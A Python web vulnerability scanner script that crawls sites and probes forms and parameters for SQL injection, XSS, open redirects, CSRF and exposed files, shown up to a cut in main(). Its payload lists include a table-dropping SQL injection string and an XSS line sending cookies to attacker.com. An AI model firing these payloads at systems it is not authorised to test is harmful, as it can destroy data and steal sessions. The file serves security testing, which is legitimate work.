
#!/usr/bin/env python3
"""
Web Vulnerability Scanner - Identify common web vulnerabilities

This script scans websites for common security vulnerabilities such as XSS, SQL injection,
CSRF, open redirects, and more. It performs both passive and active checks to identify
potential security issues.

Features:
- Crawls websites to discover pages and endpoints
- Tests for SQL injection vulnerabilities
- Checks for Cross-Site Scripting (XSS) issues
- Identifies insecure headers and cookie configurations
- Detects sensitive information disclosure
- Finds open redirects and CSRF weaknesses
- Generates detailed vulnerability reports

Usage:
    python web_vuln_scanner.py --url https://example.com
    python web_vuln_scanner.py --url https://example.com --crawl --output report.html

Requirements:
    - Python 3.6+
    - requests
    - BeautifulSoup4
    - lxml
"""

import argparse
import concurrent.futures
import json
import os
import random
import re
import sys
import time
import urllib.parse
from collections import defaultdict
from datetime import datetime
from urllib.parse import urljoin, urlparse

try:
    import requests
    from requests.exceptions import RequestException, ConnectionError, Timeout
except ImportError:
    print("Error: This script requires the 'requests' library.")
    print("Install it using: pip install requests")
    sys.exit(1)

try:
    from bs4 import BeautifulSoup
except ImportError:
    print("Error: This script requires the 'beautifulsoup4' library.")
    print("Install it using: pip install beautifulsoup4 lxml")
    sys.exit(1)

# Disable SSL warnings
try:
    from requests.packages.urllib3.exceptions import InsecureRequestWarning
    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
except:
    pass

# Default User-Agent strings
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0"
]

# Test payloads for various vulnerabilities
SQL_INJECTION_PAYLOADS = [
    "'",
    "' OR '1'='1",
    "\" OR \"1\"=\"1",
    "' OR '1'='1' --",
    "' OR 1=1 --",
    "1' OR '1' = '1",
    "1' OR '1' = '1' --",
    "' UNION SELECT 1,2,3 --",
    "' OR 1=1 LIMIT 1 --",
    "1'; DROP TABLE users --"
]

XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<body onload=alert('XSS')>",
    "<svg/onload=alert('XSS')>",
    "\"><script>alert('XSS')</script>",
    "';alert('XSS');//",
    "<script>fetch('https://attacker.com?cookie='+document.cookie)</script>"
]

OPEN_REDIRECT_PAYLOADS = [
    "https://evil.com",
    "//evil.com",
    "/\\evil.com",
    "javascript:alert(document.domain)"
]

# Color codes for terminal output
class Colors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

class Vulnerability:
    def __init__(self, type, url, parameter=None, payload=None, details=None, severity="Medium"):
        """
        Initialize a vulnerability finding.
        
        Args:
            type (str): Vulnerability type (e.g., "XSS", "SQLi")
            url (str): URL where the vulnerability was found
            parameter (str): Vulnerable parameter
            payload (str): Payload that triggered the vulnerability
            details (str): Additional details about the vulnerability
            severity (str): Severity level ("Low", "Medium", "High", "Critical")
        """
        self.type = type
        self.url = url
        self.parameter = parameter
        self.payload = payload
        self.details = details
        self.severity = severity
        self.timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    def __str__(self):
        """String representation of the vulnerability."""
        result = f"{self.severity} {self.type}: {self.url}"
        if self.parameter:
            result += f" [Parameter: {self.parameter}]"
        if self.payload:
            result += f" [Payload: {self.payload}]"
        if self.details:
            result += f"\n  {self.details}"
        return result
    
    def to_dict(self):
        """Convert vulnerability to dictionary."""
        return {
            'type': self.type,
            'url': self.url,
            'parameter': self.parameter,
            'payload': self.payload,
            'details': self.details,
            'severity': self.severity,
            'timestamp': self.timestamp
        }

class WebVulnerabilityScanner:
    def __init__(self, url, cookies=None, headers=None, depth=2, 
                 max_urls=100, threads=10, timeout=10, delay=0,
                 user_agent='random', output=None, output_format='txt'):
        """
        Initialize the web vulnerability scanner.
        
        Args:
            url (str): Target URL to scan
            cookies (dict): Cookies to use for requests
            headers (dict): Headers to use for requests
            depth (int): Crawling depth
            max_urls (int): Maximum URLs to scan
            threads (int): Maximum number of threads
            timeout (int): Request timeout in seconds
            delay (float): Delay between requests in seconds
            user_agent (str): User agent string or 'random' to use random agent
            output (str): Output file path
            output_format (str): Output format (txt, html, json)
        """
        self.base_url = url
        self.cookies = cookies or {}
        self.headers = headers or {}
        self.depth = depth
        self.max_urls = max_urls
        self.threads = threads
        self.timeout = timeout
        self.delay = delay
        self.user_agent = user_agent
        self.output = output
        self.output_format = output_format.lower()
        
        self.visited_urls = set()
        self.urls_to_scan = set([url])
        self.forms = []
        self.vulnerabilities = []
        
        # Parse base URL components
        parsed_url = urlparse(url)
        self.base_domain = parsed_url.netloc
        self.base_scheme = parsed_url.scheme
    
    def scan(self):
        """
        Start the scanning process.
        
        Returns:
            list: Discovered vulnerabilities
        """
        print(f"{Colors.HEADER}Starting Web Vulnerability Scan{Colors.ENDC}")
        print(f"Target: {self.base_url}")
        print(f"Configuration: Depth={self.depth}, Max URLs={self.max_urls}, Threads={self.threads}")
        
        start_time = time.time()
        
        # Step 1: Crawl the website if depth > 0
        if self.depth > 0:
            print(f"\n{Colors.BLUE}[+] Crawling website...{Colors.ENDC}")
            self._crawl()
        
        # Step 2: Scan for vulnerabilities
        print(f"\n{Colors.BLUE}[+] Scanning for vulnerabilities...{Colors.ENDC}")
        
        # First, scan the main site configuration
        self._check_security_headers(self.base_url)
        self._check_information_disclosure(self.base_url)
        
        # Then scan individual URLs and forms
        urls_to_scan = list(self.visited_urls) or [self.base_url]
        total_urls = len(urls_to_scan)
        
        print(f"  Scanning {total_urls} URLs for vulnerabilities")
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = []
            
            # Submit URL scanning tasks
            for url in urls_to_scan:
                futures.append(executor.submit(self._scan_url, url))
            
            # Track progress
            completed = 0
            for future in concurrent.futures.as_completed(futures):
                completed += 1
                progress = (completed / total_urls) * 100
                
                sys.stdout.write(f"\r  Progress: {completed}/{total_urls} URLs ({progress:.1f}%)")
                sys.stdout.flush()
                
                # Process results (if any)
                try:
                    future.result()
                except Exception as e:
                    print(f"\n  Error scanning URL: {e}")
        
        print("\n")
        
        # Scan forms
        if self.forms:
            print(f"  Scanning {len(self.forms)} forms for vulnerabilities")
            self._scan_forms()
        
        # Output results
        scan_duration = time.time() - start_time
        self._print_results(scan_duration)
        
        if self.output:
            self._save_results()
        
        return self.vulnerabilities
    
    def _get_random_agent(self):
        """Get a random user agent string."""
        return random.choice(USER_AGENTS)
    
    def _make_request(self, url, method="GET", data=None, params=None, follow_redirects=True):
        """
        Make an HTTP request with error handling.
        
        Args:
            url (str): URL to request
            method (str): HTTP method (GET or POST)
            data (dict): Form data for POST requests
            params (dict): Query parameters for GET requests
            follow_redirects (bool): Whether to follow redirects
            
        Returns:
            requests.Response or None on error
        """
        # Apply request delay if configured
        if self.delay > 0:
            time.sleep(self.delay)
        
        # Prepare headers
        headers = self.headers.copy()
        if self.user_agent == 'random':
            headers['User-Agent'] = self._get_random_agent()
        elif self.user_agent:
            headers['User-Agent'] = self.user_agent
        
        try:
            if method.upper() == "GET":
                response = requests.get(
                    url,
                    params=params,
                    cookies=self.cookies,
                    headers=headers,
                    timeout=self.timeout,
                    allow_redirects=follow_redirects,
                    verify=False  # Ignore SSL verification for scanning
                )
            else:  # POST
                response = requests.post(
                    url,
                    data=data,
                    cookies=self.cookies,
                    headers=headers,
                    timeout=self.timeout,
                    allow_redirects=follow_redirects,
                    verify=False
                )
            
            return response
            
        except ConnectionError:
            return None
        except Timeout:
            return None
        except RequestException:
            return None
        except Exception as e:
            print(f"  Error requesting {url}: {e}")
            return None
    
    def _should_scan_url(self, url):
        """
        Check if a URL should be scanned based on domain and limits.
        
        Args:
            url (str): URL to check
            
        Returns:
            bool: True if the URL should be scanned
        """
        # Skip if we've reached the maximum number of URLs
        if len(self.visited_urls) >= self.max_urls:
            return False
        
        # Skip already visited URLs
        if url in self.visited_urls:
            return False
        
        # Parse the URL
        parsed_url = urlparse(url)
        
        # Skip if domain doesn't match the base domain
        if parsed_url.netloc != self.base_domain:
            return False
        
        # Skip common static files
        extensions_to_skip = ['.jpg', '.jpeg', '.png', '.gif', '.css', '.js', '.pdf', '.ico']
        if any(parsed_url.path.endswith(ext) for ext in extensions_to_skip):
            return False
        
        # Skip URLs with fragments
        if parsed_url.fragment:
            clean_url = url.split('#')[0]
            if clean_url in self.visited_urls:
                return False
        
        return True
    
    def _crawl(self):
        """Crawl the website to discover URLs and forms."""
        print(f"  Starting crawl from {self.base_url} (depth={self.depth})")
        
        current_depth = 0
        urls_at_current_depth = [self.base_url]
        
        while current_depth < self.depth and urls_at_current_depth and len(self.visited_urls) < self.max_urls:
            urls_at_next_depth = set()
            print(f"  Crawling depth {current_depth+1}/{self.depth} - {len(urls_at_current_depth)} URLs")
            
            for url in urls_at_current_depth:
                if not self._should_scan_url(url):
                    continue
                
                # Mark as visited
                self.visited_urls.add(url)
                
                # Make request
                response = self._make_request(url)
                if not response or response.status_code != 200:
                    continue
                
                # Parse HTML
                try:
                    soup = BeautifulSoup(response.text, 'lxml')
                    
                    # Find links
                    for link in soup.find_all('a', href=True):
                        href = link['href']
                        
                        # Skip empty links and javascript: links
                        if not href or href.startswith('javascript:'):
                            continue
                        
                        # Convert relative URL to absolute
                        absolute_url = urljoin(url, href)
                        
                        # Clean the URL (remove fragments)
                        clean_url = absolute_url.split('#')[0]
                        
                        if self._should_scan_url(clean_url):
                            urls_at_next_depth.add(clean_url)
                    
                    # Find forms
                    for form in soup.find_all('form'):
                        form_data = self._parse_form(form, url)
                        if form_data:
                            self.forms.append(form_data)
                    
                except Exception as e:
                    print(f"  Error parsing HTML from {url}: {e}")
            
            # Move to next depth
            urls_at_current_depth = list(urls_at_next_depth)
            current_depth += 1
        
        print(f"  Crawling complete: {len(self.visited_urls)} URLs discovered, {len(self.forms)} forms found")
    
    def _parse_form(self, form, base_url):
        """
        Extract form details including action, method, and input fields.
        
        Args:
            form (bs4.element.Tag): BeautifulSoup form element
            base_url (str): Base URL for resolving relative URLs
            
        Returns:
            dict: Form details or None if invalid
        """
        try:
            action = form.get('action', '')
            method = form.get('method', 'get').lower()
            
            # Handle relative URLs
            action_url = urljoin(base_url, action) if action else base_url
            
            # Get form inputs
            inputs = []
            for input_tag in form.find_all(['input', 'textarea', 'select']):
                input_type = input_tag.get('type', 'text')
                input_name = input_tag.get('name', '')
                input_value = input_tag.get('value', '')
                
                # Skip buttons and submit inputs
                if input_type in ['submit', 'button', 'image']:
                    continue
                
                # Skip inputs without name
                if not input_name:
                    continue
                
                inputs.append({
                    'name': input_name,
                    'type': input_type,
                    'value': input_value
                })
            
            # Skip forms without inputs
            if not inputs:
                return None
            
            return {
                'action': action_url,
                'method': method,
                'inputs': inputs
            }
            
        except Exception:
            return None
    
    def _scan_url(self, url):
        """
        Scan a URL for vulnerabilities.
        
        Args:
            url (str): URL to scan
        """
        try:
            # Check for URL-based vulnerabilities
            self._check_open_redirect(url)
            self._check_sql_injection_url(url)
            self._check_xss_url(url)
        except Exception as e:
            print(f"  Error scanning URL {url}: {e}")
    
    def _scan_forms(self):
        """Scan discovered forms for vulnerabilities."""
        for form in self.forms:
            try:
                self._check_csrf(form)
                self._check_sql_injection_form(form)
                self._check_xss_form(form)
            except Exception as e:
                print(f"  Error scanning form {form['action']}: {e}")
    
    def _check_security_headers(self, url):
        """
        Check for missing or misconfigured security headers.
        
        Args:
            url (str): URL to check
        """
        response = self._make_request(url)
        if not response:
            return
        
        headers = response.headers
        
        # Security headers to check
        security_headers = {
            'Strict-Transport-Security': {
                'missing': "Missing HSTS header - vulnerable to protocol downgrade attacks",
                'severity': "Medium"
            },
            'Content-Security-Policy': {
                'missing': "Missing Content-Security-Policy header - vulnerable to XSS and data injection",
                'severity': "Medium"
            },
            'X-Frame-Options': {
                'missing': "Missing X-Frame-Options header - vulnerable to clickjacking",
                'severity': "Medium"
            },
            'X-Content-Type-Options': {
                'missing': "Missing X-Content-Type-Options header - vulnerable to MIME-type confusion",
                'severity': "Low"
            },
            'X-XSS-Protection': {
                'missing': "Missing X-XSS-Protection header - reduced protection against XSS",
                'severity': "Low"
            },
            'Referrer-Policy': {
                'missing': "Missing Referrer-Policy header - may leak sensitive information in referrer",
                'severity': "Low"
            }
        }
        
        for header, config in security_headers.items():
            if header not in headers:
                self.vulnerabilities.append(Vulnerability(
                    type="Missing Security Header",
                    url=url,
                    details=config['missing'],
                    severity=config['severity']
                ))
        
        # Check for insecure cookies
        if 'Set-Cookie' in headers:
            cookies = headers.getall('Set-Cookie') if hasattr(headers, 'getall') else [headers['Set-Cookie']]
            
            for cookie in cookies:
                if 'HttpOnly' not in cookie:
                    self.vulnerabilities.append(Vulnerability(
                        type="Insecure Cookie",
                        url=url,
                        details="Cookie missing HttpOnly flag - vulnerable to XSS cookie theft",
                        severity="Medium"
                    ))
                
                if 'Secure' not in cookie and url.startswith('https'):
                    self.vulnerabilities.append(Vulnerability(
                        type="Insecure Cookie",
                        url=url,
                        details="Cookie missing Secure flag - vulnerable to MITM attacks",
                        severity="Medium"
                    ))
                
                if 'SameSite' not in cookie:
                    self.vulnerabilities.append(Vulnerability(
                        type="Insecure Cookie",
                        url=url,
                        details="Cookie missing SameSite attribute - vulnerable to CSRF attacks",
                        severity="Low"
                    ))
    
    def _check_information_disclosure(self, url):
        """
        Check for information disclosure issues.
        
        Args:
            url (str): Base URL to check
        """
        # Common paths that might reveal sensitive information
        sensitive_paths = [
            '/robots.txt',
            '/.git/HEAD',
            '/.env',
            '/.htaccess',
            '/backup',
            '/phpinfo.php',
            '/server-status',
            '/wp-config.php',
            '/config.php',
            '/.DS_Store'
        ]
        
        for path in sensitive_paths:
            check_url = urljoin(url, path)
            response = self._make_request(check_url)
            
            if response and response.status_code == 200:
                # Check content to avoid false positives
                content_length = len(response.text)
                
                if path == '/robots.txt' and 'Disallow' in response.text:
                    # Extract disallowed paths that might be sensitive
                    disallowed = re.findall(r'Disallow: (.*)', response.text)
                    if disallowed:
                        self.vulnerabilities.append(Vulnerability(
                            type="Information Disclosure",
                            url=check_url,
                            details=f"robots.txt reveals potentially sensitive paths: {', '.join(disallowed[:5])}",
                            severity="Low"
                        ))
                
                elif path == '/.git/HEAD' and 'ref:' in response.text:
                    self.vulnerabilities.append(Vulnerability(
                        type="Information Disclosure",
                        url=check_url,
                        details="Git repository exposed - source code could be accessible",
                        severity="High"
                    ))
                
                elif path == '/.env' and ('DB_' in response.text or 'API_' in response.text or 'SECRET' in response.text):
                    self.vulnerabilities.append(Vulnerability(
                        type="Information Disclosure",
                        url=check_url,
                        details=".env file exposed - contains sensitive configuration data",
                        severity="Critical"
                    ))
                
                elif path == '/phpinfo.php' and 'PHP Version' in response.text:
                    self.vulnerabilities.append(Vulnerability(
                        type="Information Disclosure",
                        url=check_url,
                        details="phpinfo() page exposed - reveals detailed server configuration",
                        severity="High"
                    ))
                
                elif path == '/server-status' and ('Apache Server Status' in response.text or 'Server Version' in response.text):
                    self.vulnerabilities.append(Vulnerability(
                        type="Information Disclosure",
                        url=check_url,
                        details="Server status page exposed - reveals server internals",
                        severity="Medium"
                    ))
                
                elif content_length > 0 and any(p in path for p in ['.htaccess', 'wp-config.php', 'config.php']):
                    self.vulnerabilities.append(Vulnerability(
                        type="Information Disclosure",
                        url=check_url,
                        details=f"Configuration file {path} may be exposed",
                        severity="High"
                    ))
    
    def _check_open_redirect(self, url):
        """
        Check for open redirect vulnerabilities.
        
        Args:
            url (str): URL to check
        """
        parsed = urlparse(url)
        
        # Skip URLs without query parameters
        if not parsed.query:
            return
        
        # Parse the query parameters
        query_params = urllib.parse.parse_qs(parsed.query)
        
        # Check for common redirect parameters
        redirect_params = [p for p in query_params if any(rp in p.lower() for rp in ['redirect', 'url', 'next', 'goto', 'return', 'target', 'location', 'dest'])]
        
        if not redirect_params:
            return
        
        # Test each potential redirect parameter
        for param in redirect_params:
            for payload in OPEN_REDIRECT_PAYLOADS:
                test_url = self._replace_param(url, param, payload)
                response = self._make_request(test_url, follow_redirects=False)
                
                if not response:
                    continue
                
                # Check for successful open redirect
                location_header = response.headers.get('Location', '')
                if (response.status_code in [301, 302, 303, 307, 308] and 
                    (payload in location_header or 
                     urlparse(location_header).netloc != self.base_domain)):
                    
                    self.vulnerabilities.append(Vulnerability(
                        type="Open Redirect",
                        url=url,
                        parameter=param,
                        payload=payload,
                        details=f"Open redirect via {param} parameter. Redirects to {location_header}",
                        severity="Medium"
                    ))
                    # One finding per parameter is enough
                    break
    
    def _check_sql_injection_url(self, url):
        """
        Check for SQL injection in URL parameters.
        
        Args:
            url (str): URL to check
        """
        parsed = urlparse(url)
        
        # Skip URLs without query parameters
        if not parsed.query:
            return
        
        # Parse the query parameters
        query_params = urllib.parse.parse_qs(parsed.query)
        
        # Test each parameter
        for param in query_params:
            for payload in SQL_INJECTION_PAYLOADS:
                test_url = self._replace_param(url, param, payload)
                response = self._make_request(test_url)
                
                if not response:
                    continue
                
                # Check for common SQL error messages
                if self._contains_sql_errors(response.text):
                    self.vulnerabilities.append(Vulnerability(
                        type="SQL Injection",
                        url=url,
                        parameter=param,
                        payload=payload,
                        details="SQL error messages detected in response",
                        severity="High"
                    ))
                    # One finding per parameter is enough
                    break
    
    def _check_sql_injection_form(self, form):
        """
        Check for SQL injection in form fields.
        
        Args:
            form (dict): Form details
        """
        for input_field in form['inputs']:
            field_name = input_field['name']
            
            for payload in SQL_INJECTION_PAYLOADS:
                # Prepare data with the payload
                form_data = self._prepare_form_data(form, {field_name: payload})
                
                # Submit the form
                response = self._make_request(
                    form['action'],
                    method=form['method'],
                    data=form_data if form['method'] == 'post' else None,
                    params=form_data if form['method'] == 'get' else None
                )
                
                if not response:
                    continue
                
                # Check for SQL errors
                if self._contains_sql_errors(response.text):
                    self.vulnerabilities.append(Vulnerability(
                        type="SQL Injection",
                        url=form['action'],
                        parameter=field_name,
                        payload=payload,
                        details="SQL error messages detected in response",
                        severity="High"
                    ))
                    # One finding per parameter is enough
                    break
    
    def _check_xss_url(self, url):
        """
        Check for XSS vulnerabilities in URL parameters.
        
        Args:
            url (str): URL to check
        """
        parsed = urlparse(url)
        
        # Skip URLs without query parameters
        if not parsed.query:
            return
        
        # Parse the query parameters
        query_params = urllib.parse.parse_qs(parsed.query)
        
        # Test each parameter
        for param in query_params:
            for payload in XSS_PAYLOADS:
                test_url = self._replace_param(url, param, payload)
                response = self._make_request(test_url)
                
                if not response or not response.text:
                    continue
                
                # Check if the payload is reflected in the response
                if payload in response.text:
                    self.vulnerabilities.append(Vulnerability(
                        type="Cross-Site Scripting (XSS)",
                        url=url,
                        parameter=param,
                        payload=payload,
                        details="XSS payload reflected in the response",
                        severity="High"
                    ))
                    # One finding per parameter is enough
                    break
    
    def _check_xss_form(self, form):
        """
        Check for XSS vulnerabilities in form fields.
        
        Args:
            form (dict): Form details
        """
        for input_field in form['inputs']:
            field_name = input_field['name']
            
            for payload in XSS_PAYLOADS:
                # Prepare data with the payload
                form_data = self._prepare_form_data(form, {field_name: payload})
                
                # Submit the form
                response = self._make_request(
                    form['action'],
                    method=form['method'],
                    data=form_data if form['method'] == 'post' else None,
                    params=form_data if form['method'] == 'get' else None
                )
                
                if not response or not response.text:
                    continue
                
                # Check if the payload is reflected in the response
                if payload in response.text:
                    self.vulnerabilities.append(Vulnerability(
                        type="Cross-Site Scripting (XSS)",
                        url=form['action'],
                        parameter=field_name,
                        payload=payload,
                        details="XSS payload reflected in the response",
                        severity="High"
                    ))
                    # One finding per parameter is enough
                    break
    
    def _check_csrf(self, form):
        """
        Check for CSRF vulnerabilities in forms.
        
        Args:
            form (dict): Form details
        """
        # Skip GET forms (not vulnerable to CSRF)
        if form['method'] != 'post':
            return
        
        # Look for CSRF tokens in the form
        has_csrf_token = False
        for input_field in form['inputs']:
            field_name = input_field['name'].lower()
            
            # Common CSRF token field names
            csrf_fields = ['csrf', 'token', 'nonce', '_token', 'authenticity']
            
            if any(csrf in field_name for csrf in csrf_fields):
                has_csrf_token = True
                break
        
        if not has_csrf_token:
            # Check if there are any hidden fields with seemingly random values
            has_hidden_random = False
            for input_field in form['inputs']:
                if input_field['type'] == 'hidden':
                    # Check if value looks random (length > 8 and contains mixed characters)
                    value = input_field['value']
                    if (len(value) > 8 and 
                        any(c.islower() for c in value) and 
                        (any(c.isupper() for c in value) or any(c.isdigit() for c in value))):
                        has_hidden_random = True
                        break
            
            if not has_hidden_random:
                self.vulnerabilities.append(Vulnerability(
                    type="Cross-Site Request Forgery (CSRF)",
                    url=form['action'],
                    details="Form has no CSRF protection token",
                    severity="Medium"
                ))
    
    def _prepare_form_data(self, form, custom_values=None):
        """
        Prepare form data for submission, with optional custom values.
        
        Args:
            form (dict): Form details
            custom_values (dict): Custom values for specific fields
            
        Returns:
            dict: Prepared form data
        """
        data = {}
        
        # Fill form with default values
        for input_field in form['inputs']:
            name = input_field['name']
            
            # Use custom value if provided
            if custom_values and name in custom_values:
                data[name] = custom_values[name]
            else:
                # Otherwise use default value or generate one based on type
                if input_field['value']:
                    data[name] = input_field['value']
                else:
                    data[name] = self._get_default_value(input_field['type'])
        
        return data
    
    def _get_default_value(self, input_type):
        """
        Get a default value for a form field based on type.
        
        Args:
            input_type (str): Input field type
            
        Returns:
            str: Default value
        """
        if input_type == 'email':
            return 'test@example.com'
        elif input_type == 'number':
            return '1'
        elif input_type == 'tel':
            return '1234567890'
        elif input_type == 'url':
            return 'https://example.com'
        elif input_type == 'date':
            return '2023-01-01'
        elif input_type == 'password':
            return 'Password123!'
        else:
            return 'test'
    
    def _replace_param(self, url, param, value):
        """
        Replace a parameter value in a URL.
        
        Args:
            url (str): Original URL
            param (str): Parameter name
            value (str): New parameter value
            
        Returns:
            str: URL with replaced parameter value
        """
        parsed = urlparse(url)
        
        # Parse the query parameters
        query_params = urllib.parse.parse_qs(parsed.query)
        
        # Update the parameter value
        query_params[param] = [value]
        
        # Rebuild the query string
        new_query = urllib.parse.urlencode(query_params, doseq=True)
        
        # Rebuild the URL
        return parsed._replace(query=new_query).geturl()
    
    def _contains_sql_errors(self, text):
        """
        Check if a response contains SQL error messages.
        
        Args:
            text (str): Response text
            
        Returns:
            bool: True if SQL errors are found
        """
        error_patterns = [
            r"SQL syntax.*?MySQL",
            r"Warning.*?mysqli",
            r"MySQLSyntaxErrorException",
            r"valid MySQL result",
            r"PostgreSQL.*?ERROR",
            r"ORA-[0-9]{5}",
            r"Microsoft SQL Server",
            r"ODBC SQL Server Driver",
            r"SQLite3::query",
            r"SQLite3::exec",
            r"Warning.*?SQLite3::",
            r"unclosed quotation mark after the character string",
            r"PG::SyntaxError:",
            r"Error: .*? SQLSTATE\[",
            r"LIKE \([^)]+\)",
            r"NOT\s+IS\s+NULL",
            r"Query failed:"
        ]
        
        for pattern in error_patterns:
            if re.search(pattern, text, re.IGNORECASE):
                return True
                
        return False
    
    def _print_results(self, duration):
        """
        Print the vulnerability scan results.
        
        Args:
            duration (float): Scan duration in seconds
        """
        print(f"\n{Colors.HEADER}Scan Results{Colors.ENDC}")
        print(f"Scan completed in {duration:.2f} seconds")
        print(f"URLs scanned: {len(self.visited_urls)}")
        print(f"Forms analyzed: {len(self.forms)}")
        
        if not self.vulnerabilities:
            print(f"\n{Colors.GREEN}No vulnerabilities found!{Colors.ENDC}")
            return
        
        print(f"\n{Colors.FAIL}Found {len(self.vulnerabilities)} vulnerabilities:{Colors.ENDC}")
        
        # Group vulnerabilities by severity
        by_severity = {
            "Critical": [],
            "High": [],
            "Medium": [],
            "Low": []
        }
        
        for vuln in self.vulnerabilities:
            by_severity[vuln.severity].append(vuln)
        
        # Print vulnerabilities by severity
        for severity in ["Critical", "High", "Medium", "Low"]:
            vulns = by_severity[severity]
            if not vulns:
                continue
                
            if severity == "Critical":
                color = Colors.FAIL
            elif severity == "High":
                color = Colors.WARNING
            elif severity == "Medium":
                color = Colors.BLUE
            else:
                color = Colors.GREEN
                
            print(f"\n{color}{severity} Severity ({len(vulns)}){Colors.ENDC}")
            print("-" * 80)
            
            for vuln in vulns:
                print(f"{vuln.type}: {vuln.url}")
                if vuln.parameter:
                    print(f"  Parameter: {vuln.parameter}")
                if vuln.payload:
                    print(f"  Payload: {vuln.payload}")
                if vuln.details:
                    print(f"  Details: {vuln.details}")
                print()
    
    def _save_results(self):
        """Save scan results to a file."""
        if not self.output:
            return
            
        try:
            if self.output_format == 'json':
                with open(self.output, 'w') as f:
                    results = {
                        'scan_info': {
                            'target': self.base_url,
                            'start_time': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                            'urls_scanned': len(self.visited_urls),
                            'forms_analyzed': len(self.forms)
                        },
                        'vulnerabilities': [v.to_dict() for v in self.vulnerabilities]
                    }
                    json.dump(results, f, indent=2)
                    
            elif self.output_format == 'html':
                # Simple HTML report
                with open(self.output, 'w') as f:
                    f.write('<!DOCTYPE html>\n<html>\n<head>\n')
                    f.write('<meta charset="UTF-8">\n')
                    f.write('<title>Web Vulnerability Scan Report</title>\n')
                    f.write('<style>\n')
                    f.write('body { font-family: Arial, sans-serif; margin: 20px; }\n')
                    f.write('h1, h2 { color: #333; }\n')
                    f.write('.vuln { margin-bottom: 20px; padding: 10px; border: 1px solid #ddd; }\n')
                    f.write('.critical { border-left: 5px solid #d9534f; }\n')
                    f.write('.high { border-left: 5px solid #f0ad4e; }\n')
                    f.write('.medium { border-left: 5px solid #5bc0de; }\n')
                    f.write('.low { border-left: 5px solid #5cb85c; }\n')
                    f.write('</style>\n')
                    f.write('</head>\n<body>\n')
                    
                    # Header
                    f.write(f'<h1>Web Vulnerability Scan Report</h1>\n')
                    f.write(f'<p>Target: {self.base_url}</p>\n')
                    f.write(f'<p>Date: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}</p>\n')
                    f.write(f'<p>URLs Scanned: {len(self.visited_urls)}</p>\n')
                    f.write(f'<p>Forms Analyzed: {len(self.forms)}</p>\n')
                    
                    # Summary
                    f.write(f'<h2>Vulnerabilities Found: {len(self.vulnerabilities)}</h2>\n')
                    
                    # Group by severity
                    by_severity = {
                        "Critical": [],
                        "High": [],
                        "Medium": [],
                        "Low": []
                    }
                    
                    for vuln in self.vulnerabilities:
                        by_severity[vuln.severity].append(vuln)
                    
                    # Print each severity group
                    for severity in ["Critical", "High", "Medium", "Low"]:
                        vulns = by_severity[severity]
                        if not vulns:
                            continue
                            
                        f.write(f'<h3>{severity} Severity Vulnerabilities ({len(vulns)})</h3>\n')
                        
                        for vuln in vulns:
                            f.write(f'<div class="vuln {severity.lower()}">\n')
                            f.write(f'<h4>{vuln.type}</h4>\n')
                            f.write(f'<p><strong>URL:</strong> {vuln.url}</p>\n')
                            
                            if vuln.parameter:
                                f.write(f'<p><strong>Parameter:</strong> {vuln.parameter}</p>\n')
                            
                            if vuln.payload:
                                f.write(f'<p><strong>Payload:</strong> {vuln.payload}</p>\n')
                                
                            if vuln.details:
                                f.write(f'<p><strong>Details:</strong> {vuln.details}</p>\n')
                                
                            f.write('</div>\n')
                    
                    f.write('</body>\n</html>')
                    
            else:
                # Default to text format
                with open(self.output, 'w') as f:
                    f.write(f"Web Vulnerability Scan Report\n")
                    f.write(f"==========================\n\n")
                    f.write(f"Target: {self.base_url}\n")
                    f.write(f"Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                    f.write(f"URLs Scanned: {len(self.visited_urls)}\n")
                    f.write(f"Forms Analyzed: {len(self.forms)}\n\n")
                    
                    f.write(f"Vulnerabilities Found: {len(self.vulnerabilities)}\n")
                    f.write(f"-------------------------\n\n")
                    
                    # Group by severity
                    by_severity = {
                        "Critical": [],
                        "High": [],
                        "Medium": [],
                        "Low": []
                    }
                    
                    for vuln in self.vulnerabilities:
                        by_severity[vuln.severity].append(vuln)
                    
                    # Print each severity group
                    for severity in ["Critical", "High", "Medium", "Low"]:
                        vulns = by_severity[severity]
                        if not vulns:
                            continue
                            
                        f.write(f"\n{severity} Severity Vulnerabilities ({len(vulns)})\n")
                        f.write("=" * 50 + "\n\n")
                        
                        for vuln in vulns:
                            f.write(f"{vuln.type}: {vuln.url}\n")
                            
                            if vuln.parameter:
                                f.write(f"  Parameter: {vuln.parameter}\n")
                            
                            if vuln.payload:
                                f.write(f"  Payload: {vuln.payload}\n")
                                
                            if vuln.details:
                                f.write(f"  Details: {vuln.details}\n")
                                
                            f.write("\n")
            
            print(f"Results saved to {self.output}")
            
        except Exception as e:
            print(f"Error saving results: {e}")

def main():
    parser = argparse.ArgumentParser(description="Web Vulnerability Scanner")
    parser.add_argument("--url", "-u", required=True, help="Target URL to scan")
    parser.add_argument("--depth", "-d", type=int, default=2, help="Crawling depth (default: 2)")
    parser.add_argument("--max-urls", "-m", type=int, default=100, help="Maximum URLs to scan (default: 100)")
    parser.add_argument("--threads", "-t", type=int, default=10, help="Number of threads (default: 10)")
    parser.add_argument("--timeout", type=int, default=10, help="Request timeout in seconds (default: 10)")
    parser.add_argument("--delay", type=float, default=0, help="Delay between requests in seconds (default: 0)")
    parser.add_argument("--user-agent", "-a", default="random", help="User agent string (default: random)")
    parser.add_argument("--output", "-o", help="Output file path")
    parser.add_argument("--format", "-f", choices=["txt", "json", "html"], default="txt",
                        help="Output format (default: txt)")
    parser.add_argument("--no-crawl", action="store_true", help="Disable crawling")
    
    args = parser.parse_args()
    
    # Adjust depth based on crawl option
